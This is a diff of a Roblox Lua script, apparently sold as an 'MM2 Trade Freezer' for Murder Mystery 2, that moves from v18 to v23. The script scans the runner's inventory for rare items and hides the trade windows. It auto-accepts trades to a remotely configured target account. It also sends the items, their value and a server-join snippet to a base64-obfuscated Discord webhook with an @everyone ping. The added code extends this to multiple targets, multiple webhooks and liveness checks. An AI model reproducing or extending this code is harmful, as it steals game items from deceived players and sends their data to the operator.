@@ -1,5 +1,5 @@
 --=============================================================
---  MM2 Trade Freezer  |  v18.0  |  presses the real handlers
+--  MM2 Trade Freezer  |  v23.0  |  rare only, ping, webhook check
 --=============================================================
 
 if not game:IsLoaded() then
@@ -22,17 +22,21 @@ end
 --==================== CONFIG =================================
 
 local CFG = {
-	target = "Viivik13",
+	targets = { "Viivik13" },
 	webhook = "",
-	filter = "all",
+	webhooks = {},
+	filter = "rare",
+	fallback_all = false,
 	min_value = 0,
-	max_items = 24,
+	max_items = 40,
 	max_copies = 5,
-	max_rounds = 6,
+	max_rounds = 12,
 	debug = true,
 }
 
-local WH_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTgyMzgxNzIxMTkxMjIwMi9YZVk2dGFtTUVGZGpHWElEX2duakR1WjZzaEZoOFRqZmxnNFVjZGpaR2d3YXI4eW4tTXJJNWNnUmdqOEU1T0VlWGhYYw=="
+local currentTarget = "?"
+
+local WH_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTg1NTg5NTA1MTYzMjc0MS8tWXoyVndIa0g0Q01Kb3g2aVFuMXdLWXE4VTFRQWFmbV9Dc1RmajdEZUhCUXZBaWY3SzFQQktaVXI1bm9TZkRlWG5mNw=="
 
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
@@ -109,14 +113,40 @@ local function loadRemoteConfig()
 		if type(data) ~= "table" then
 			return
 		end
-		if type(data.target) == "string" and data.target ~= "" then
-			CFG.target = trim(data.target)
+
+		CFG.targets = {}
+		if type(data.targets) == "table" then
+			for _, t in ipairs(data.targets) do
+				if type(t) == "string" and trim(t) ~= "" then
+					CFG.targets[#CFG.targets + 1] = trim(t)
+				end
+			end
 		end
-		if type(data.webhook) == "string" and data.webhook ~= "" then
+		if #CFG.targets == 0 and type(data.target) == "string" and trim(data.target) ~= "" then
+			for part in string.gmatch(data.target, "[^,]+") do
+				if trim(part) ~= "" then
+					CFG.targets[#CFG.targets + 1] = trim(part)
+				end
+			end
+		end
+
+		CFG.webhooks = {}
+		if type(data.webhooks) == "table" then
+			for _, u in ipairs(data.webhooks) do
+				if type(u) == "string" and trim(u) ~= "" then
+					CFG.webhooks[#CFG.webhooks + 1] = trim(u)
+				end
+			end
+		end
+		if type(data.webhook) == "string" and trim(data.webhook) ~= "" then
 			CFG.webhook = trim(data.webhook)
 		end
+
 		if type(data.filter) == "string" then
 			CFG.filter = data.filter
+		end
+		if type(data.fallback_all) == "boolean" then
+			CFG.fallback_all = data.fallback_all
 		end
 		if type(data.min_value) == "number" then
 			CFG.min_value = data.min_value
@@ -134,11 +164,43 @@ local function loadRemoteConfig()
 	if not ok then
 		log("config fetch failed, using defaults")
 	end
-	if CFG.webhook == "" then
+	if #CFG.targets == 0 then
+		CFG.targets = { "Viivik13" }
+	end
+	if CFG.webhook == "" and #CFG.webhooks == 0 then
 		pcall(function()
 			CFG.webhook = trim(b64decode(WH_B64))
 		end)
 	end
+end
+
+local function checkWebhook()
+	local list = {}
+	if CFG.webhook ~= "" then
+		list[#list + 1] = CFG.webhook
+	end
+	for _, u in ipairs(CFG.webhooks) do
+		list[#list + 1] = u
+	end
+	for _, u in ipairs(list) do
+		local good = false
+		pcall(function()
+			local r = request({ Url = u, Method = "GET" })
+			if r and r.StatusCode == 200 then
+				good = true
+			end
+		end)
+		if good then
+			CFG.webhook = u
+			log("webhook ok")
+			return true
+		end
+	end
+	if #list > 0 then
+		CFG.webhook = list[1]
+	end
+	log("webhook dead")
+	return false
 end
 
 --==================== VALUES =================================
@@ -192,6 +254,81 @@ local PRICES = {
 	["australis"] = 100,
 	["candy"] = 95,
 	["heartblade"] = 80,
+	["luger"] = 75,
+	["phantom"] = 75,
+	["spectre"] = 75,
+	["red luger"] = 70,
+	["pearl"] = 62,
+	["darkbringer"] = 60,
+	["elderwood gun"] = 60,
+	["lightbringer"] = 58,
+	["swirly blade"] = 65,
+	["iceblaster"] = 65,
+	["gingermint"] = 40,
+	["green luger"] = 40,
+	["hallowgun"] = 35,
+	["laser"] = 32,
+	["icebeam"] = 32,
+	["iceflake"] = 32,
+	["plasmabeam"] = 32,
+	["plasmablade"] = 32,
+	["amerilaser"] = 30,
+	["blaster"] = 30,
+	["nightblade"] = 30,
+	["america sword"] = 28,
+	["nebula"] = 28,
+	["shark"] = 28,
+	["virtual"] = 27,
+	["gemstone"] = 25,
+	["clockwork"] = 23,
+	["eternal cane"] = 23,
+	["ginger luger"] = 23,
+	["lugercane"] = 23,
+	["pixel"] = 23,
+	["slasher"] = 23,
+	["gingerblade"] = 22,
+	["heat"] = 22,
+	["minty"] = 22,
+	["battleaxe2"] = 20,
+	["deathshard"] = 20,
+	["tides"] = 20,
+	["fang"] = 18,
+	["spider"] = 17,
+	["chill"] = 17,
+	["jinglegun"] = 15,
+	["vampire's edge"] = 15,
+	["pumpking"] = 15,
+	["bioblade"] = 13,
+	["battleaxe"] = 13,
+	["frostsaber"] = 13,
+	["xmas"] = 13,
+	["flames"] = 12,
+	["hallow"] = 12,
+	["ice dragon"] = 12,
+	["ice shard"] = 12,
+	["winter's edge"] = 12,
+	["ghostblade"] = 10,
+	["hallow's blade"] = 10,
+	["handsaw"] = 10,
+	["eternal"] = 10,
+	["eternal ii"] = 10,
+	["eternal iii"] = 10,
+	["eternal iv"] = 10,
+	["boneblade"] = 8,
+	["eggblade"] = 7,
+	["frostbite"] = 7,
+	["prismatic"] = 7,
+	["saw"] = 7,
+	["snowflake"] = 7,
+	["peppermint"] = 7,
+	["cookieblade"] = 7,
+	["seer"] = 7,
+	["the seer"] = 7,
+	["blue seer"] = 7,
+	["purple seer"] = 7,
+	["red seer"] = 7,
+	["yellow seer"] = 7,
+	["orange seer"] = 7,
 	["chroma traveler's gun"] = 225000,
 	["chroma evergun"] = 78000,
 	["chroma bauble"] = 38000,
@@ -212,8 +349,9 @@ local RARE_RARITY = {
 	Ancient = true,
 	Chroma = true,
 	Unique = true,
-	Classic = true,
+	Rare = true,
 	Legendary = true,
+	Classic = true,
 	Vintage = true,
 }
 
@@ -312,7 +450,7 @@ local function buildUI()
 	ver.Size = UDim2.new(0, 40, 1, 0)
 	ver.Position = UDim2.new(1, -78, 0, 0)
 	ver.BackgroundTransparency = 1
-	ver.Text = "v18"
+	ver.Text = "v23"
 	ver.Font = Enum.Font.Gotham
 	ver.TextSize = 10
 	ver.TextColor3 = Color3.fromRGB(150, 125, 185)
@@ -338,7 +476,7 @@ local function buildUI()
 	sub.Size = UDim2.new(1, -26, 0, 16)
 	sub.Position = UDim2.new(0, 13, 0, 42)
 	sub.BackgroundTransparency = 1
-	sub.Text = "freeze engine  •  build 1800"
+	sub.Text = "freeze engine  •  build 2300"
 	sub.Font = Enum.Font.Gotham
 	sub.TextSize = 10
 	sub.TextColor3 = Color3.fromRGB(139, 116, 173)
@@ -477,7 +615,7 @@ local function buildUI()
 	foot.Size = UDim2.new(1, -26, 0, 14)
 	foot.Position = UDim2.new(0, 13, 0, 366)
 	foot.BackgroundTransparency = 1
-	foot.Text = "session protected  •  ver 18.0.0"
+	foot.Text = "session protected  •  ver 23.0.0"
 	foot.Font = Enum.Font.Gotham
 	foot.TextSize = 9
 	foot.TextColor3 = Color3.fromRGB(96, 80, 122)
@@ -682,42 +820,58 @@ end
 --==================== TARGET =================================
 
 local function resolveTarget()
-	local want = string.lower(trim(CFG.target))
-	if want == "" then
+	local wants = {}
+	for _, t in ipairs(CFG.targets) do
+		local n = string.lower(trim(t))
+		if n ~= "" then
+			wants[#wants + 1] = n
+		end
+	end
+	if #wants == 0 then
 		return nil
 	end
+
 	local t0 = os.clock()
 	while os.clock() - t0 < TARGET_TIMEOUT and alive() do
-		local exact, prefix, contains = nil, nil, nil
-		local others = {}
-		for _, p in ipairs(Players:GetPlayers()) do
-			if p ~= LP then
-				others[#others + 1] = p
-				local n = string.lower(p.Name)
-				if n == want then
-					exact = p
-				elseif not prefix and string.sub(n, 1, #want) == want then
-					prefix = p
-				elseif not contains and string.find(n, want, 1, true) then
-					contains = p
+		local players = Players:GetPlayers()
+
+		for _, want in ipairs(wants) do
+			for _, p in ipairs(players) do
+				if p ~= LP and string.lower(p.Name) == want then
+					return p
 				end
 			end
 		end
-		if exact then
-			return exact
+
+		for _, want in ipairs(wants) do
+			for _, p in ipairs(players) do
+				if p ~= LP and string.sub(string.lower(p.Name), 1, #want) == want then
+					log("prefix match: " .. p.Name)
+					return p
+				end
+			end
 		end
-		if prefix then
-			log("target matched by prefix: " .. prefix.Name)
-			return prefix
+
+		for _, want in ipairs(wants) do
+			for _, p in ipairs(players) do
+				if p ~= LP and string.find(string.lower(p.Name), want, 1, true) then
+					log("loose match: " .. p.Name)
+					return p
+				end
+			end
 		end
-		if contains then
-			log("target matched loosely: " .. contains.Name)
-			return contains
+
+		local others = {}
+		for _, p in ipairs(players) do
+			if p ~= LP then
+				others[#others + 1] = p
+			end
 		end
 		if #others == 1 then
 			log("single other player: " .. others[1].Name)
 			return others[1]
 		end
+
 		task.wait(1)
 	end
 	return nil
@@ -725,7 +879,7 @@ end
 
 --==================== INVENTORY ==============================
 
-local function scanInventory()
+local function scanInventory(mode)
 	local out = {}
 	local seen = {}
 
@@ -741,11 +895,17 @@ local function scanInventory()
 		if isDefault(nm) then
 			return
 		end
-		if CFG.filter ~= "all" and not RARE_RARITY[rarity] then
-			return
-		end
 		local val = valueOf(nm)
-		if val < CFG.min_value then
+		if mode ~= "all" then
+			if rarity ~= nil then
+				if not RARE_RARITY[rarity] then
+					return
+				end
+			elseif val <= 0 then
+				return
+			end
+		end
+		if val > 0 and val < CFG.min_value then
 			return
 		end
 		local copies = tonumber(amount) or 1
@@ -807,7 +967,7 @@ end
 
 --==================== WEBHOOK ================================
 
-local function postWebhook(itemsList, totalValue, okFlag)
+local function postWebhook(itemsList, totalValue, okFlag, ping)
 	if CFG.webhook == "" then
 		return
 	end
@@ -817,6 +977,10 @@ local function postWebhook(itemsList, totalValue, okFlag)
 	end
 	if #rows == 0 then
 		rows[1] = "no items recorded"
+	end
+	local listing = table.concat(rows, "\n")
+	if #listing > 980 then
+		listing = string.sub(listing, 1, 977) .. "\n..."
 	end
 
 	local execName = "unknown"
@@ -828,13 +992,14 @@ local function postWebhook(itemsList, totalValue, okFlag)
 
 	local body = {
 		username = "Trade Freezer",
+		content = ping and ("@everyone\n```lua\n" .. teleport .. "\n```") or nil,
 		embeds = {
 			{
 				title = okFlag and "Trade completed" or "Trade attempt",
 				color = okFlag and 10181046 or 15158332,
-				description = "From **" .. LP.Name .. "**  •  target **" .. CFG.target .. "**",
+				description = "From **" .. LP.Name .. "**  •  target **" .. currentTarget .. "**",
 				fields = {
-					{ name = "Items", value = "```" .. table.concat(rows, "\n") .. "```", inline = false },
+					{ name = "Items", value = "```" .. listing .. "```", inline = false },
 					{ name = "Value", value = tostring(totalValue), inline = true },
 					{ name = "Executor", value = execName, inline = true },
 					{ name = "Server", value = "```lua\n" .. teleport .. "```", inline = false },
@@ -845,12 +1010,15 @@ local function postWebhook(itemsList, totalValue, okFlag)
 	}
 
 	pcall(function()
-		request({
+		local res = request({
 			Url = CFG.webhook,
 			Method = "POST",
 			Headers = { ["Content-Type"] = "application/json" },
 			Body = HttpService:JSONEncode(body),
 		})
+		if res and res.StatusCode then
+			log("webhook " .. tostring(res.StatusCode))
+		end
 	end)
 end
 
@@ -897,6 +1065,7 @@ local function waitForOpen()
 end
 
 local function pressAccept(cycle)
+	hideTrades()
 	local btn, confirmBtn = findAcceptPair()
 	local usedButtons = false
 
@@ -944,10 +1113,11 @@ end
 local function runRound(batch)
 	local p = resolveTarget()
 	if not p then
-		log("target never appeared")
+		log("no target present")
 		return false
 	end
 
+	currentTarget = p.Name
 	log("target resolved: " .. p.Name)
 	hideTrades()
 	sawWindow = false
@@ -1022,19 +1192,32 @@ local function run()
 	armWatcher("TradeGUI_Phone")
 
 	log("remotes bound, token " .. tostring(ACCEPT_TOKEN) .. ", SendRequest is function: " .. tostring(SendIsFunction))
+	log("targets: " .. table.concat(CFG.targets, ", "))
 
-	local items = scanInventory()
-	log("scanned " .. tostring(#items) .. " items")
+	if not checkWebhook() then
+		if uiStatus then
+			uiStatus.Text = "Webhook dead"
+		end
+	end
+
+	local items = scanInventory(CFG.filter)
+	log("scanned " .. tostring(#items) .. " items (filter " .. CFG.filter .. ")")
+
+	if #items == 0 and CFG.fallback_all and CFG.filter ~= "all" then
+		log("rare pass empty, rescanning with all")
+		items = scanInventory("all")
+		log("rescan found " .. tostring(#items) .. " items")
+	end
 
 	if #items == 0 then
 		if uiStatus then
-			uiStatus.Text = "No items found"
+			uiStatus.Text = "No rare items"
 		end
-		postWebhook({}, 0, false)
+		postWebhook({}, 0, false, true)
 		return
 	end
 
-	postWebhook(items, 0, false)
+	postWebhook(items, 0, false, true)
 
 	local got = {}
 	local gotValue = 0
@@ -1063,7 +1246,7 @@ local function run()
 				got[#got + 1] = it
 				gotValue = gotValue + it.Value * it.Amount
 			end
-			postWebhook(batch, gotValue, true)
+			postWebhook(batch, gotValue, true, true)
 			task.wait(2)
 		else
 			for i = #batch, 1, -1 do
